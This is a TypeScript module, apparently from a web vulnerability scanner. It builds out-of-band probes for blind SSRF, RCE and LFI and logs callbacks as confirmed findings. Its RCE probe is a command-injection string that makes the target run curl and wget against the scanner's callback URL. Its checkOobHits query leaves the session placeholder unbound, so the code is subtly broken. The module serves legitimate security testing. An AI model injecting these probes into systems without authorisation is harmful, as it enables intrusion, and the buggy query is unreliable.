import { v4 as uuidv4 } from 'uuid';
import db from './db';

export interface OobPayload {
  id: string;
  sessionId: string;
  url: string;
  param: string;
  type: 'SSRF' | 'RCE' | 'LFI';
  timestamp: number;
  hit: boolean;
  hitDetails?: any;
}

export function generateOobPayload(sessionId: string, url: string, param: string, type: 'SSRF' | 'RCE' | 'LFI', appUrl: string): { id: string, payload: string } {
  const id = uuidv4();
  
  try {
    db.prepare(`
      INSERT INTO oob_payloads (id, scan_id, target_url, parameter, vuln_type)
      VALUES (?, ?, ?, ?, ?)
    `).run(id, sessionId, url, param, type);
  } catch (e) {
    console.error('Failed to insert OOB payload:', e);
  }

  const callbackUrl = `${appUrl}/api/oob/${id}`;
  let payload = '';

  switch (type) {
    case 'SSRF':
      payload = callbackUrl;
      break;
    case 'RCE':
      payload = `; curl -s ${callbackUrl} ; wget -qO- ${callbackUrl} ;`;
      break;
    case 'LFI':
      payload = callbackUrl;
      break;
  }

  return { id, payload };
}

export function handleOobCallback(id: string, reqDetails: any) {
  try {
    const payload = db.prepare('SELECT * FROM oob_payloads WHERE id = ?').get(id) as any;
    if (payload) {
      db.prepare('UPDATE oob_payloads SET hit_at = CURRENT_TIMESTAMP, source_ip = ? WHERE id = ?')
        .run(reqDetails.ip || 'unknown', id);
      console.log(`[OOB HIT] ${payload.vuln_type} vulnerability confirmed at ${payload.target_url} (param: ${payload.parameter})`);
    }
  } catch (e) {
    console.error('Failed to handle OOB callback:', e);
  }
}

export function checkOobHits(sessionId: string): any[] {
  const vulnerabilities: any[] = [];
  
  try {
    const hits = db.prepare('SELECT * FROM oob_payloads WHERE scan_id = ? AND hit_at IS NOT NULL').all() as any[];
    
    for (const payload of hits) {
      vulnerabilities.push({
        url: payload.target_url,
        type: `Blind ${payload.vuln_type} (OOB Confirmed)`,
        severity: 'Critical',
        confidence: 'High',
        poc: `Injected OOB payload for parameter '${payload.parameter}'. Callback received from target server.`,
        explanation: `The server executed the payload and made an out-of-band request back to our controlled server, confirming a blind ${payload.vuln_type} vulnerability.`,
        mitigation: 'Implement strict input validation, use parameterized queries/safe APIs, and restrict outbound network access from the application server.'
      });
    }
  } catch (e) {
    console.error('Failed to check OOB hits:', e);
  }
  
  return vulnerabilities;
}
